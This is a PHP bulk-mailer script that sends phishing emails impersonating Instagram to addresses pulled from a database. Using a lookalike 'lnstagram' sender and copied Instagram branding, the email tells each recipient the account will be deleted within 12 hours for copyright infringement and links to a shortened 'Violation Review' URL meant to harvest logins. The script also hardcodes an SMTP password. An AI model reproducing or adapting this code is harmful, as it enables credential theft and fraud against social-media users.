<?php 	
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;
include("../app/config/config2.php");
require '../data/vendor/autoload.php';
$mail = new PHPMailer(true);
$sorgu = mysqli_query($con,"SELECT * FROM mailler WHERE submit='no' LIMIT 1");
while($sonuc = mysqli_fetch_assoc($sorgu)) {
$gelenusername = $sonuc['username'];
$gelenmail = $sonuc['mail'];	

	$mailad = "lnstagram@help-ruleviolation.com";
    $mail->SMTPDebug = SMTP::DEBUG_SERVER;  // hata ayıklama acık kapatmak ıstersenız silip 0 yazmanız yeterli acmanız için 1 yaomanız yeterli                  
    $mail->isSMTP();                                       
    $mail->Host       =  'smtp.beget.com';                  
    $mail->SMTPAuth   = true;                                
    $mail->Username   = $mailad;                    
    $mail->Password   = '1kp*ycWG';                             
    $mail->SMTPSecure = 'tls'; 
    $mail->Port       = 2525;       // tcp port 587 veya 465                           
    $mail->setFrom($mailad, $gelenusername);
    $mail->addAddress($gelenmail, $gelenusername);  
    $cevir = rand(000000,999999);
    $mail->isHTML(true); 
    $mail->Subject = 'lnstagram Copyright @'.$gelenusername; 
    $mail->Body    = '
<table align="center" border="0" cellpadding="0" cellspacing="0" id="m_-3688053845612311993m_-8824883644157579120m_5590218048203431361m_4134940362267612874m_-5963626411474160523m_2725227560950655130m_-8019221184605673292m_-4890080473974941948m_-5478820084832714093m_8228779490141474432m_8650168215170683202m_8232697122293763660m_6820357893727065076email_table" style="font-family:sans-serif; font-size:large">
	<tbody>
		<tr>
			<table border="0" cellpadding="0" cellspacing="0" style="width:100%">
				<tbody>
					<tr>
						<td colspan="3" height="1" style="line-height: 1px;">&nbsp;</td>
					</tr>
					<tr>
						<td>
						<table border="0" cellpadding="0" cellspacing="0" style="border:1px solid white; margin:0px auto 5px; padding:3px 0px; text-align:center; width:430px">
							<tbody>
								<tr>
									<td style="width: 15px;" width="15px">&nbsp;</td>
									<td style="line-height: 0px; width: 400px; padding: 0px 0px 15px;">
									<table border="0" cellpadding="0" cellspacing="0">
										<tbody>
											<tr>
												<td style="width: 158.5px; text-align: left; height: 33px;"><img alt="" height="33" src="https://ci4.googleusercontent.com/proxy/H-WMBt20rSRWwIK0YLwC8Uyi1mnXWEEEiUT0twBA78N4_Rbri9VuqAL_Azd6xVjLkSiTQ6r1RjyDJ2Hx1O_3UqLo4H_LxG1o8LHL4yDfZw=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v3/yb/r/QTa-gpOyYBa.png" /></td>
											</tr>
										</tbody>
									</table>
									</td>
									<td style="width: 15px;" width="15px">&nbsp;</td>
								</tr>
								<tr>
									<td style="width: 15px;" width="15px">&nbsp;</td>
									<td style="border-top: 1px solid rgb(219, 219, 219);">&nbsp;</td>
									<td style="width: 15px;" width="15px">&nbsp;</td>
								</tr>
							</tbody>
						</table>
						</td>
					</tr>
					<tr>
						<td>
						<table border="0" cellpadding="0" cellspacing="0" style="margin:0px auto; width:430px">
							<tbody>
								<tr>
									<td>
									<table border="0" cellpadding="0" cellspacing="0" style="margin:0px auto; width:430px">
										<tbody>
											<tr>
												<td style="width: 15px;" width="15">&nbsp;&nbsp;&nbsp;</td>
											</tr>
											<tr>
												<td>
												<table border="0" cellpadding="0" cellspacing="0" style="width:100%">
													<tbody>
														<tr>
															<td>
															<table border="0" cellpadding="0" cellspacing="0">
																<tbody>
																	<tr>
																		<td style="width: 20px;" width="20">&nbsp;&nbsp;&nbsp;</td>
																		<td>
																		<table border="0" cellpadding="0" cellspacing="0">
																			<tbody>
																				<tr>
																					<td>
																					<p style="margin-top: 10px; margin-bottom: 10px; color: rgb(86, 90, 92); font-size: 18px;">Hello,  '.$gelenusername. ',</p>

	 																	<p style="margin-top: 10px; margin-bottom: 10px;">Your Instagram account will be permanently deleted from our servers within 12 hours due to copyright infringement..</p>

																					<p style="margin-top: 10px; margin-bottom: 10px;">If you think we will remove your account by mistake, click on the &nbsp;<a 
																				data-saferedirecturl=" "	href="https://cutt.ly/Instagram-help-confrim">Violation Review</a>:</p>
                 <p style="margin-top: 10px; margin-bottom: 10px;">button and fill in the next required fields . </p>
																					<p style="margin-top: 10px; margin-bottom: 10px; color: rgb(86, 90, 92); font-size: 18px;"><font size="6">'.'</font></p>

																					<p style="margin-top: 10px; margin-bottom: 10px; color: rgb(86, 90, 92); font-size: 18px;">&nbsp;</p>
																					</td>
																				</tr>
																			</tbody>
																		</table>
																		</td>
																	
																	</tr>
																</tbody>
															</table>
															</td>
														</tr>
													</tbody>
												</table>
												</td>
											</tr>
										</tbody>
									</table>
									</td>
								</tr>
							</tbody>
						</table>
						</td>
					</tr>
					<tr>
						<td>
						<table border="0" cellpadding="0" cellspacing="0" style="margin:0px auto; width:430px">
							
								<tr>
									<td style="width: 20px;" width="20">&nbsp;&nbsp;</td>
									<td>
									

									<div style="color: rgb(171, 173, 174); font-size: 11px; margin: 0px auto 5px;">&copy; Instagram. Facebook Inc., 1601 Willow Road, Menlo Park, CA 94025</div>
									</td>
									<td style="width: 20px;" width="20">&nbsp;&nbsp;&nbsp;</td>
								</tr>
							</tbody>
						</table>
						</td>
					</tr>
					<tr>
						<td colspan="3" height="20" style="line-height: 20px;">&nbsp;</td>
					</tr>
				</tbody>
			</table>
			</td>
		</tr>
	</tbody>
</table>
';

	
	if($mail->send()){
    echo 'Mesaj Gönderildi:';
	mysqli_query($con,"UPDATE mailler SET submit='yes' WHERE id='".$sonuc['id']."'");
}else{
		echo "mail gonderilmedi";
	}

}


 ?>